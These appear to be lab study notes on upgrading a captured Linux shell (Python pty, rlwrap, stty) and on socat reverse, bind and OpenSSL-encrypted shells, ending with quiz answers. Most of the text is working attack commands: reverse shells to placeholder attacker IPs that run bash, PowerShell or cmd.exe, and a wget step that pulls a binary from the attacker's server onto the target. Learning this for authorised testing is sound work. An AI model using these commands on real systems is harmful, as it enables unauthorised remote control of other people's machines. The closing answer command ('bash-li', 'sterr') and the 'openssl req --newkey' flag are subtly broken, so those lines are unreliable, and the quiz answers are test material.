# WHAT THE SHELL

## Technique 1: Python

The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:

 1. The first thing to do is use 
```
 python -c 'import pty;pty.spawn("/bin/bash")'
```
 which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace python with python2 or python3 as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.

 2. Step two is: 
```
 export TERM=xterm
```
 this will give us access to term commands such as clear.
 
 3. Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use
```
 stty raw -echo; fg
```
 This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process. 

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.

## Technique 2: rlwrap

rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell.

To use rlwrap, we invoke a slightly different listener:

```
rlwrap nc -lvnp <port>
```
When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell. 

## Technique 3: Socat

Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or `wget (wget <LOCAL-IP>/socat -O /tmp/socat`). 

Here's the syntax for a basic reverse shell listener in socat:
```
socat TCP-L:<port> -
```
On Windows we would use this command to connect back:
```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```
The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

This is the equivalent command for a Linux Target:
```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

## Socat Bind Shells

On a Linux target we would use the following command:
```
socat TCP-L:<PORT> EXEC:"bash -li"
```
On a Windows target we would use this command for our listener:
```
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```
We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.
```
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

# SOCAT FULLY STABLE LINUX TTY REVERSE SHELL

Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell.
```
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary, which can then be executed as normal.

The special command is as follows:
```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:
```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
We then need to merge the two created files into a single .pem file:
```
cat shell.key shell.crt > shell.pem
```
Now, when we set up our reverse shell listener, we use:
```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```
To connect back, we would use:
```
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```
The same technique would apply for a bind shell:

Target:
```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```
Attacker:
```
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```
---

What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"
```
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
```

If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?
```
socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash-li",pty,sterr,sigint,setsid,sane
```

